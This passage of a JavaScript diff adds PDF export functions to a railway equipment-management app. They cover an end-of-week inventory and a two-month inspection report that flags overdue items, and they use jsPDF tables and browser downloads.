+      }),
+      styles:{fontSize:7,cellPadding:2},
+      headStyles:{fillColor:[70,114,196],textColor:255,fontStyle:'bold',fontSize:7},
+      columnStyles:{0:{font:'courier',fontSize:6},2:{fontStyle:'bold'},3:{fontStyle:'bold'},4:{fontStyle:'bold'}},
+      didParseCell:(data)=>{
+        if(data.section==='body'){
+          const m=catMats[data.row.index];
+          if(data.column.index===2) data.cell.styles.textColor=eColor(m?.etat);
+          if(data.column.index===3) data.cell.styles.textColor=pColor(m?.presence);
+          if(data.column.index===4) data.cell.styles.textColor=m?.verifLundi?.weekKey===wkNow||m?.verifSemaine?.weekKey===wkNow?[26,122,58]:[150,150,150];
+        }
+      },
+      margin:{left:14,right:14},
+    });
+    curY=doc.lastAutoTable.finalY+5;
+  });
+  const pageCount=doc.getNumberOfPages();
+  for(let i=1;i<=pageCount;i++){
+    doc.setPage(i);doc.setFontSize(7);doc.setTextColor(150,150,150);
+    doc.text('RailOps — SFERIS · '+now,14,doc.internal.pageSize.getHeight()-6);
+    doc.text(c.nom+' · Inventaire '+wk+' · Page '+i+'/'+pageCount,pw-14,doc.internal.pageSize.getHeight()-6,{align:'right'});
+  }
+  const fname='Inventaire_FinSemaine_'+c.nom.replace(/[^a-z0-9]/gi,'_').slice(0,20)+'_'+wk+'.pdf';
+  const blob=doc.output('blob');const url=URL.createObjectURL(blob);
+  const isIOS=/iPad|iPhone|iPod/.test(navigator.userAgent)&&!window.MSStream;
+  if(isIOS){window.open(url,'_blank');toast('PDF prêt — Partager → Enregistrer dans Fichiers','ok');}
+  else{const a=document.createElement('a');a.href=url;a.download=fname;document.body.appendChild(a);a.click();document.body.removeChild(a);setTimeout(()=>URL.revokeObjectURL(url),10000);}
+  toast('Inventaire fin de semaine exporté ✓','ok');
+}
+
+// Export PDF contrôle 2 mois
+function exportControle2mPDF(){
+  const c=getC(S.curC);if(!c)return;
+  const mats=[...matOfC(S.curC)].sort((a,b)=>a.id.localeCompare(b.id,'fr'));
+  if(!mats.length){toast('Aucun article','warn');return;}
+  const {jsPDF}=window.jspdf;
+  const doc=new jsPDF({orientation:'portrait',unit:'mm',format:'a4'});
+  const pw=doc.internal.pageSize.getWidth();
+  const now=new Date().toLocaleDateString('fr-FR',{day:'2-digit',month:'2-digit',year:'numeric'});
+  const d2m=60*24*60*60*1000;
+  const rows=mats.map(m=>{
+    const last=m.controle2m;
+    const lastCtrl=last?new Date(last.date):null;
+    const joursSans=lastCtrl?Math.floor((new Date()-lastCtrl)/(1000*60*60*24)):null;
+    const du=!lastCtrl||(new Date()-lastCtrl)>d2m;
+    const urgent=!lastCtrl||(new Date()-lastCtrl)>d2m*1.2;
+    return{m,last,lastCtrl,joursSans,du,urgent};
+  }).sort((a,b)=>{ if(!a.lastCtrl&&!b.lastCtrl)return 0;if(!a.lastCtrl)return-1;if(!b.lastCtrl)return 1;return a.lastCtrl-b.lastCtrl;});
+  const enRetard=rows.filter(r=>r.urgent).length;
+  const aDue=rows.filter(r=>r.du&&!r.urgent).length;
+  const ok=rows.filter(r=>!r.du).length;
+  // Header
+  doc.setFillColor(245,166,35);doc.rect(0,0,pw,16,'F');
+  doc.setTextColor(255,255,255);doc.setFontSize(13);doc.setFont('helvetica','bold');
+  doc.text('RailOps — SFERIS',14,10);
+  doc.setFontSize(8);doc.setFont('helvetica','normal');
+  doc.text('Contrôles visuels 2 mois',pw-14,10,{align:'right'});
+  doc.setTextColor(30,30,30);doc.setFontSize(14);doc.setFont('helvetica','bold');
+  doc.text(c.nom,14,24);
+  doc.setFontSize(9);doc.setFont('helvetica','normal');doc.setTextColor(100,100,100);
+  doc.text(c.lieu,14,30);doc.text('Généré le '+now,pw-14,24,{align:'right'});
+  doc.setFontSize(9);doc.setFont('helvetica','bold');
+  if(enRetard>0){doc.setTextColor(192,57,43);doc.text('⚠ '+enRetard+' en retard · '+aDue+' à faire · '+ok+' OK',14,37);}
+  else{doc.setTextColor(26,122,58);doc.text(ok+' article(s) OK · '+aDue+' à faire prochainement',14,37);}
+  doc.autoTable({
+    startY:43,
+    head:[['Référence','Désignation','Catégorie','Dernier contrôle','Agent','Jours écoulés','Statut']],
+    body:rows.map(({m,last,joursSans,du,urgent})=>[
+      m.id,m.nom,m.cat,
+      last?new Date(last.date).toLocaleDateString('fr-FR',{day:'2-digit',month:'2-digit',year:'numeric'}):'Jamais',
+      last?.agentNom||'—',
+      joursSans!==null?joursSans+'j':'—',
+      urgent?'⚠ En retard':du?'À contrôler':'✓ OK'
+    ]),
+    styles:{fontSize:7,cellPadding:2},
+    headStyles:{fillColor:[60,60,80],textColor:255,fontStyle:'bold',fontSize:7},
+    columnStyles:{0:{font:'courier',fontSize:6}},
+    didParseCell:(data)=>{
+      if(data.section==='body'){
+        const r=rows[data.row.index];
+        if(data.column.index===6){
+          data.cell.styles.textColor=r.urgent?[192,57,43]:r.du?[179,106,0]:[26,122,58];
+          data.cell.styles.fontStyle='bold';
+        }
+        if(data.column.index===5&&r.joursSans!==null){
+          data.cell.styles.textColor=r.urgent?[192,57,43]:r.du?[179,106,0]:[26,122,58];
+        }
+      }
+    },
+    margin:{left:14,right:14},
+  });
+  const pageCount=doc.getNumberOfPages();
+  for(let i=1;i<=pageCount;i++){
+    doc.setPage(i);doc.setFontSize(7);doc.setTextColor(150,150,150);
+    doc.text('RailOps — SFERIS · '+now,14,doc.internal.pageSize.getHeight()-6);
+    doc.text(c.nom+' · Contrôles 2 mois · Page '+i+'/'+pageCount,pw-14,doc.internal.pageSize.getHeight()-6,{align:'right'});
+  }
+  const fname='Controles2m_'+c.nom.replace(/[^a-z0-9]/gi,'_').slice(0,20)+'_'+now.replace(/\//g,'-')+'.pdf';
+  const blob=doc.output('blob');const url=URL.createObjectURL(blob);
+  const isIOS=/iPad|iPhone|iPod/.test(navigator.userAgent)&&!window.MSStream;
+  if(isIOS){window.open(url,'_blank');toast('PDF prêt — Partager → Enregistrer dans Fichiers','ok');}
+  else{const a=document.createElement('a');a.href=url;a.download=fname;document.body.appendChild(a);a.click();document.body.removeChild(a);setTimeout(()=>URL.revokeObjectURL(url),10000);}
+  toast('PDF contrôles 2 mois exporté ✓','ok');
 }
 
 // Export PDF avec données passées directement (pour fin de chantier)
